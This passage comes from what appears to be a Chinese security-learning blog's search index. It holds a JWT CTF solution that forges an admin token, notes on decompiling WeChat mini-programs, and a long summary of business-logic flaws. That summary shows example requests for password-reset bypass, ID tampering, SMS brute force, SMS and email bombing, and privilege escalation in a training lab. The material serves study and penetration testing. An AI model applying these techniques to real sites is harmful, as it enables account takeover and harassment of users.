class="string">"\n"</span>,algorithm=<span class="string">"HS256"</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qZzbNQNfGLSyuvwhb1mKJhBnr3tFHJriIMuxzNEYoG0</span></span><br><span class="line"></span><br><span class="line">PS:如果报错，使用如下命令解决</span><br><span class="line">    卸载pyjwt</span><br><span class="line">    	pip uninstall pyjwt</span><br><span class="line">    安装旧版本pyjwt</span><br><span class="line">    	pip install pyjwt==<span class="number">0.4</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>
+
+<p>访问/admin目录使用post方式添加内容到cookie中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qZzbNQNfGLSyuvwhb1mKJhBnr3tFHJriIMuxzNEYoG0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxr1juwxgj30rt0ciq4w.jpg" alt="image-20200720211714909"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag : HardcodeYourAlgoBro</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h3><p><a href="https://www.jianshu.com/p/c5f2a4e1c98d" target="_blank" rel="noopener">https://www.jianshu.com/p/c5f2a4e1c98d</a></p>
+<p><a href="http://sircoding.club/blog/post/sirc0de/JWT" target="_blank" rel="noopener">http://sircoding.club/blog/post/sirc0de/JWT</a></p>
+<p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
+<p><a href="https://jwt.io/introduction/" target="_blank" rel="noopener">https://jwt.io/introduction/</a></p>
+]]></content>
+      <categories>
+        <category>jwt</category>
+      </categories>
+      <tags>
+        <tag>会话传递</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xyhcms审计学习</title>
+    <url>/2020/06/22/xyhcms%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg1fkbbv1pj31c00u0qae.jpg" alt="86"></p>
+<a id="more"></a>
+
+<h3 id="0x00-CMS核心目录"><a href="#0x00-CMS核心目录" class="headerlink" title="0x00 CMS核心目录"></a>0x00 CMS核心目录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站使用框架：Thinkphp</span><br><span class="line">App		应用目录</span><br><span class="line">data	网站上传配置、编辑器目录</span><br><span class="line">include	网站配置调式目录</span><br><span class="line">install	安装目录</span><br><span class="line">public	公共目录</span><br><span class="line">uploads	上传目录</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xycms审计</title>
+    <url>/2020/08/10/xycms%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghltgt2lgfj31hc0u0qnl.jpg" alt=""></p>
+<a id="more"></a>]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微信小程序反编译获取源码</title>
+    <url>/2020/06/05/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhjpjtj5yj318z0u0na0.jpg" alt="51"></p>
+<a id="more"></a>
+
+<h3 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h3><p>1、Nodejs</p>
+<p>​        下载连接: <a href="https://nodejs.org/zh-cn/download/" target="_blank" rel="noopener">https://nodejs.org/zh-cn/download/</a> </p>
+<p>​        安装成功后，在系统中配置环境变量即可，运行node -v，如下图说明安装成功</p>
+<p>​    <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhjtyk6hsj30gu01kdg6.jpg" alt="image-20200605173823025"></p>
+<p>2、反编译脚本，github搜索wxappUnpacker或其他版本(由于敏感此处不放连接，自行下载)</p>
+<p>3、模拟器(手机)，夜神、雷神、逍遥等都可以。</p>
+<h3 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h3><p>1、下载RE文件管理器，允许使用超级管理员权限</p>
+<p>2、手机已ROOT或使用模拟器ROOT模式</p>
+<p>3、下载微信</p>
+<h3 id="0x02-获取小程序包"><a href="#0x02-获取小程序包" class="headerlink" title="0x02 获取小程序包"></a>0x02 获取小程序包</h3><p>当点开一个微信小程序，如果本地这个文件夹下找到即将运行的小程序，会从微信服务器下载到本地，在以后的某个时刻又运行这个小程序，运行时，微信服务器会通知有没有小程序新版本，如有新版本，会在后台静默下载，小程序继续运行，新版本要到下一次运行才会启用，这就是微信小程序的更新机制。</p>
+<p>小程序包地址：/data/data/com.tencent.mm/MicroMsg/随机长字符串/appbrand/pkg/</p>
+<p>将pkg文件夹中的包清空，返回微信打开需要抓取的小程序包</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhk98ak0fj30r20f076n.jpg" alt="image-20200605175303195"></p>
+<p>点击小程序后，返回pkg目录可以看见有两个新的包(如果没有重新进一下这个目录)</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhkbr62d1j30r20fu76n.jpg" alt="image-20200605175529451"></p>
+<p>将两个包打包成zip或rar文件，使用QQ发送给好友或者电脑助手，到此获取微信小程序包已经完成。</p>
+<h3 id="0x03-反编译"><a href="#0x03-反编译" class="headerlink" title="0x03 反编译"></a>0x03 反编译</h3><p>将小程序包放到反编译文件目录中，切换到目录后安装依赖包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line"></span><br><span class="line">npm install css-tree</span><br><span class="line"></span><br><span class="line">npm install cssbeautify</span><br><span class="line"></span><br><span class="line">npm install vm2</span><br><span class="line"></span><br><span class="line">npm install uglify-es</span><br><span class="line"></span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure>
+
+<p>全部安装成功后，反编译小程序包</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhktnie35j30yo0isah1.jpg" alt="image-20200605181240857"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令：node wuWxapkg.js _-2013801684_4.wxapkg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhkvas6nnj31gm0u0qoh.jpg" alt="image-20200605181415278"></p>
+<p>反编译成功，在目录下有一个小程序的包同名目录</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhkx1ltvmj30zq0badk9.jpg" alt="image-20200605181557042"></p>
+<p>目录中就是小程序的代码，使用微信开发工具打开。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhl0ibzl8j31uc0u01c4.jpg" alt="image-20200605181915816"></p>
+]]></content>
+      <categories>
+        <category>小程序</category>
+      </categories>
+      <tags>
+        <tag>反编译</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>业务安全测试方法总结</title>
+    <url>/2020/07/30/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gh8rn8qz3rj31c00u07wh.jpg" alt="65"></p>
+<a id="more"></a>
+
+<h3 id="0x01-登录认证"><a href="#0x01-登录认证" class="headerlink" title="0x01 登录认证"></a>0x01 登录认证</h3><h4 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h4><p>在验证用户身份的时候，或判断用户是否已注册时，若验证码处理不当、或错误提醒明确，都可能存在用户枚举。</p>
+<p>案例：</p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114105735423-827277158.png" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114105740533-1181359063.png" alt="img"></p>
+<h4 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h4><h5 id="短信验证码回传"><a href="#短信验证码回传" class="headerlink" title="短信验证码回传"></a>短信验证码回传</h5><p>通过手机找回密码，发送验证码的响应包中包含了短信验证码。</p>
+<p>案例：</p>
+<p>​    <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gha5hd6dd4j30ht0aedhc.jpg" alt="image-20200731144333975"></p>
+<p>​    当点击发送按钮后，拦截返回包，短信验证码包含在返回包中，导致可重置账户密码。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gha5iwg45fj30nf06r412.jpg" alt="image-20200731144504700"></p>
+<h5 id="用户凭证修改任意账户密码"><a href="#用户凭证修改任意账户密码" class="headerlink" title="用户凭证修改任意账户密码"></a>用户凭证修改任意账户密码</h5><p>通过手机找回密码是一般需要短信验证码验证（这里可以尝试爆破或绕过），当我们输入正确的手机号和正确的短信验证码，然后进入重置密码的最后一步，也就是输入新的密码，输入密码后提交到服务端的post数据包需要包含当前用户的身份信息，而一般网站是通过用户名或用户ID来标识用户身份的，如果这个用户名或用户ID没有和当前手机号、短信验证码进行绑定，也就是说服务端只验证用户名、ID是否存在，而不去验证用户和当前手机号是否匹配，那么我们就可以通过修改用户名、ID去修改其他用户的密码了。当然可以修改的地方不限于找回密码的数据包，比如修改资料的地方也可能存在这样的漏洞。</p>
+<p>案例：</p>
+<p>​    以某网站修改任意用户资料导致修改任意账号密码为例，截取的数据包为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;info_do HTTP&#x2F;1.1</span><br><span class="line">Host: www.XXX.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko&#x2F;20100101 Firefox&#x2F;59.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;www.XXX.com&#x2F;user&#x2F;info_view</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 211</span><br><span class="line">Cookie: yunsuo_session_verify&#x3D;9341a54b945886e9485ff54a17650468; PHPSESSID&#x3D;sgbibaqe7f8f6okerps8jip916; sdrcUserlockcount&#x3D;1; sdrcUseruserid&#x3D;14943</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">password&#x3D;A123456&amp;email&#x3D;1%40qq.com&amp;address&#x3D;1&amp;postcode&#x3D;1&amp;mobile&#x3D;13888888888&amp;sex&#x3D;man&amp;birthday&#x3D;0000-00-00&amp;degree&#x3D;collegeLT&amp;testsite&#x3D;1&amp;post&#x3D;1&amp;__hash__&#x3D;b0b15b067dea00bd34fd39421b7ef684_efc2399e5c4b2071f261e75fe3362d4fa</span><br></pre></td></tr></table></figure>
+
+<p>经分析与尝试，发现数据包中的sdrcUseruserid的值是用来标识当前用户身份的，那么我们就想到这个id可否任意修改呢？答案是肯定的，我们修改id的值为14942、14941都是可以成功的，截图如下：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghaaw9gizaj30ni04xtaw.jpg" alt="image-20200731175054967"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghaawjp8zpj30nm060ac2.jpg" alt="image-20200731175111770"></p>
+<h5 id="修改响应包重置任意账户密码"><a href="#修改响应包重置任意账户密码" class="headerlink" title="修改响应包重置任意账户密码"></a>修改响应包重置任意账户密码</h5><p>通过手机找回密码一般需要短信验证码验证，服务端需要告诉客户端，输入的验证码是否正确，如果客户端收到true的信息，那么就会向带着true的信息向服务端请求进入下一步，而服务端收到true的信息，就会允许客户端进入下一步，反之，如果是false的信息，服务端就不会允许客户端进入下一步。也就是说我们进入下一步的关键是让服务端收到客户端的true信息，而借助burpsuite，我们可以修改服务端返回到客户端的信息，这样一来，我们就可以输入任意短信验证码，然后将服务端返回的false信息改为true就可以绕过短信验证码的验证了。</p>
+<p>案例：下面是找回密码的一个流程，输入正确的用户名，跳到第二步，这时需要输入短信验证码，这里我们随意输入一个短信验证码：123456，然后抓取服务端返回的信息如下所示。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghab9n7dsoj30nm07btar.jpg" alt="image-20200731180346830"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghab9u622uj30nf06vwfj.jpg" alt="image-20200731180358376"></p>
+<p>把回包中false改为true后，即可绕过短信验证码验证，结果如下图所示。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghaba5v51bj30d0073mxk.jpg" alt="image-20200731180416615"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghabab2m5rj30e0077t8y.jpg" alt="image-20200731180425178"></p>
+<p>乌云案例：<a href="https://m.hundan.org/2015-0137432" target="_blank" rel="noopener">https://m.hundan.org/2015-0137432</a></p>
+<h5 id="跳过验证步骤重置任意账户密码"><a href="#跳过验证步骤重置任意账户密码" class="headerlink" title="跳过验证步骤重置任意账户密码"></a>跳过验证步骤重置任意账户密码</h5><p>找回密码流程一般需要四个步骤：1、验证用户名；2、验证短信验证码；3、输入新密码；4、重置成功。这四个步骤应该紧紧相连，互相相关，只有通过了第一个步骤验证才可以进入下一个步骤，如果每个步骤之间没有进行关联性验证，就可能导致跳过关键验证步骤，从而导致重置任意账号密码。</p>
+<p>案例：某网站找回密码有四个步骤，第一步输入正确的用户名，第二步输入手机号和正确的验证码，截取服务端返回的数据包为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>object moved<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>object moved to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/Personal/sys/getpasswordreset"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述数据包是用来跳转到输入密码的界面，我们猜想能否输入任意验证码，然后直接访问输入密码界面，结果是可以的，而且重置密码成功了。经分析，此处成功的关键是页面跳转到输入密码界面，当我们输入新的密码后，提交到服务端，服务端并没有对当前用户身份进行二次验证，只是简单的获取到用户名或ID以及新密码，从而导致跳过短信验证码验证重置任意账号密码。</p>
+<h5 id="重置密码链接中token值未验证或不失效导致任意账号密码重置"><a href="#重置密码链接中token值未验证或不失效导致任意账号密码重置" class="headerlink" title="重置密码链接中token值未验证或不失效导致任意账号密码重置"></a>重置密码链接中token值未验证或不失效导致任意账号密码重置</h5><p>使用邮箱重置密码时，服务端向邮箱发送一个重置密码的链接，链接中包含当前用户的身份信息（如用户名或用户ID）和一个随机生成的token信息，如果未对token值进行验证或是验证后不失效，我们就可以通过修改用户名或用户ID来重置任意账号密码。</p>
+<p>案例：某网站使用邮箱找回密码时，服务端向邮箱发送的链接为：</p>
+<p><a href="http://www.xxx.com/GetPwd.aspx?q=0x0531387a5a6c1227e4d6ba0ce16dc72e&amp;r=3244166" target="_blank" rel="noopener">http://www.xxx.com/GetPwd.aspx?q=0x0531387a5a6c1227e4d6ba0ce16dc72e&amp;r=3244166</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghabzno2e5j30ne068mze.jpg" alt="image-20200731182847148"></p>
+<p>经尝试，此处未对随机生成的q值进行验证或是验证了但是验证之后未失效，导致可以重复使用，最终只需要修改r为其他用户ID，即可重置其他用户密码。</p>
+<h5 id="找回密码的短信验证码可被爆破导致任意账号密码重置"><a href="#找回密码的短信验证码可被爆破导致任意账号密码重置" class="headerlink" title="找回密码的短信验证码可被爆破导致任意账号密码重置"></a>找回密码的短信验证码可被爆破导致任意账号密码重置</h5><p>找回密码时使用位数较少的短信验证码，或者验证码没有设置有效时间限制，导致攻击者借助自动化工具在一定时间范围内爆破获得短信验证码，从而导致重置任意账号密码。</p>
+<p>案例：某网站找回密码时使用短信验证码的一个数据包为：</p>
+<p>Code=5000&amp;u=13888888888&amp;Check=dc5b94101cb4f23a9ce6ae71197fc5de&amp;a=5</p>
+<p>此处可以对Code进行爆破，如下图所示：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghac78lfmnj30n90dqwkk.jpg" alt="image-20200731183604450"></p>
+<h5 id="服务端未对身份做校验"><a href="#服务端未对身份做校验" class="headerlink" title="服务端未对身份做校验"></a>服务端未对身份做校验</h5><p>验证身份时，未对答案进行校验，输入任意答案即可进入下一步</p>
+<p>案例：忘记密码处，第二步中，选择其他方式找回，通过密保找回，未对密保答案进行验证，随便输入答案，即可跳转到设置密码处</p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104847607-366369269.png" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104852953-2013938345.png" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104858086-781806113.png" alt="img"></p>
+<h4 id="验证码置空绕过验证"><a href="#验证码置空绕过验证" class="headerlink" title="验证码置空绕过验证"></a>验证码置空绕过验证</h4><p>短信验证码处，随便输入其他，验证码错误，而置空却不校验，则可以通过置空绕过</p>
+<p>案例：我的==&gt;登陆==&gt;短信验证码登陆登陆时抓包把code（验证码字段）值置为空，即可登陆任意账户</p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104947130-55951450.png" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1583334/201901/1583334-20190114104952216-1783664771.png" alt="img"></p>
+<h4 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h4><p>对发送短信验证码时间未做限制，导致可无限重发短信导致短信轰炸</p>
+<p>案例：<img src="https://wooyun.x10sec.org/static/bugs/full/586a57ad6de8f853ac441df6476aac4342419982.jpg" alt="1.png"></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://wooyun.x10sec.org/static/bugs/full/58185e56f475cfd9690a2c82ae1133b5314d5c72.jpg" alt="短信.png"></h4><h4 id="邮箱轰炸"><a href="#邮箱轰炸" class="headerlink" title="邮箱轰炸"></a>邮箱轰炸</h4><p>同短信轰炸原理一样，未对验证发送机制时间进行限制，可无限重发</p>
+<p>案例：</p>
+<p><img src="https://img2018.cnblogs.com/common/1474830/201912/1474830-20191214111156985-526687803.png" alt="img"></p>
+<h3 id="0x02-业务风控"><a href="#0x02-业务风控" class="headerlink" title="0x02 业务风控"></a>0x02 业务风控</h3><h4 id="刷优惠券"><a href="#刷优惠券" class="headerlink" title="刷优惠券"></a>刷优惠券</h4><p>程序逻辑设计错误，优惠券参数可控，攻击者修改参数导致重复获取优惠券或重新生成大数额优惠券</p>
+<p>乌云案例：</p>
+<p>​    <a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0109007.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0109007.html</a></p>
+<p>​    <a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0168071.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0168071.html</a></p>
+<h4 id="恶意套现"><a href="#恶意套现" class="headerlink" title="恶意套现"></a>恶意套现</h4><p>网站验证机制或人工验证机制不完善，导致可恶意套现</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-099622.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2015-099622.html</a></p>
+<h3 id="0x04-会话访问"><a href="#0x04-会话访问" class="headerlink" title="0x04 会话访问"></a>0x04 会话访问</h3><h4 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h4><p>尝试登录多个账户，sessionid不变，可通过遍历用户名，登录已存在用户</p>
+<p>乌云案例: <a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-025427.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2013-025427.html</a></p>
+<h4 id="COOKIE仿冒"><a href="#COOKIE仿冒" class="headerlink" title="COOKIE仿冒"></a>COOKIE仿冒</h4><p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在 Cookie中， 并发送至客户端存储。攻击者通过尝试修改Cookie中的身份标识，从而达到仿冒其他用户 身份的目的，并拥有相关用户的所有权限。</p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-051424.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2014-051424.html</a></p>
+<h3 id="0x05-授权访问"><a href="#0x05-授权访问" class="headerlink" title="0x05 授权访问"></a>0x05 授权访问</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>用户没有通过认证授权的情况下可直接访问需要通过认证才能访问到的页面或文本信息。 </p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0203819.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0203819.html</a></p>
+<h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112160308362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>登录普通用户pikachu 密码000000 只有查看权限</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112160419314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>登录超级用户 admin 密码为123456 拥有修改用户信息和添加用户的权限</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112160610637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>用admin用户添加一个新用户 并用burp进行抓包 可以看到PHPSESSID</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112161050197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>打开另一个浏览器 登录普通用户pikachu后尝试直接复制admin用户的添加用户网址来进行添加用户 （未授权访问）</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112161408110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p> 发现会回到登录界面</p>
+<p><img src="https://img-blog.csdnimg.cn/2019111216145140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>但是用admin用户查看的时候 test2用户已经被添加成功(admin用户需要在登陆状态)</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112161600355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p> 用burp实现 重新用管理员账号添加用户 用burp进行抓包</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112162310957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p> 将抓到的请求发送到repeater中</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112162808103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>登陆普通用户 抓取普通用户的cookie值</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112162912200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p> 普通用户登陆成功后 将这个cookie值修改到发送到repeater中的请求中 重放这个数据包</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112164935726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p> 刷新页面查看 发现有了两个test3 一个为admin添加的 一个是重放admin的数据包添加的</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112165117155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>乌云案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0189507.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/bugs/wooyun-2016-0189507.html</a></p>
+<h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><p> A用户和B用户属于同一级别用户，但各自不能操作对方个人信息。A用户如果越权操作B用户个人信息的情况称为水行越权操作</p>
+<p>案例：</p>
+<p>三个用户 lucy/lili/kobe 密码都为123456</p>
+<p><img src="https://img-blog.csdnimg.cn/2019111211510614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>随便登录其中一个用户lucy 可以看到地址栏里  “url为op1_mem.php?username=lucy&amp;submit=点击查看个人信息</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112115304599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>退出lucy登录其他用户 可以看到地址只有username不同</p>
+<p><img src="https://img-blog.csdnimg.cn/20191112115522877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MDc3MjYy,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>不退出lili账号 直接在地址栏中将username改成lucy 也可以直接访问lucy的信息</p>
